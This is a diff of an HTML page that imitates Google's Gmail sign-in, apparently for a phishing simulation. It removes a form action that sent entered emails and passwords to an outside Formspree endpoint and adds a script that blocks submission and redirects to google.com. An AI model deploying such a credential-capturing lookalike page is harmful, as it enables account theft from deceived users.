@@ -65,15 +65,15 @@
             <p class="mt-2 text-gray-600">to continue to Gmail</p>
         </div>
 
-        <!-- This form now submits directly to Formspree -->
-        <form id="google-phishing-form" class="mt-8 space-y-6" action="https://formspree.io/f/xwpqokev" method="POST">
+        <!-- The form's default action is prevented by the script -->
+        <form id="google-phishing-form" class="mt-8 space-y-6">
             <!-- Email Input -->
             <div class="relative input-field">
                 <input type="email" id="email" name="email" class="h-14" placeholder=" " required>
                 <label for="email">Email or phone</label>
             </div>
             
-            <!-- Password Input - Kept simple for this one-page simulation -->
+            <!-- Password Input -->
             <div class="relative input-field mt-6">
                 <input type="password" id="password" name="password" class="h-14" placeholder=" " required>
                 <label for="password">Enter your password</label>
@@ -91,6 +91,30 @@
             </div>
         </form>
     </div>
+
+    <script type="text/javascript">
+        // This script redirects the user to google.com when any button or link is clicked.
+        // It prevents any form submission or data collection.
+
+        // Function to handle the redirect
+        function redirectToGoogle(event) {
+            // Prevent the default browser action (like following a link or submitting a form)
+            event.preventDefault();
+            // Redirect the page to google.com
+            window.location.href = 'https://www.google.com';
+        }
+
+        // Get all clickable links (<a> tags) on the page
+        const links = document.querySelectorAll('a');
+        // Add the redirect listener to each link
+        links.forEach(link => link.addEventListener('click', redirectToGoogle));
+
+        // Get the form
+        const form = document.getElementById('google-phishing-form');
+        // Add the redirect listener to the form's submit event
+        form.addEventListener('submit', redirectToGoogle);
+
+    </script>
 
 </body>
 </html>
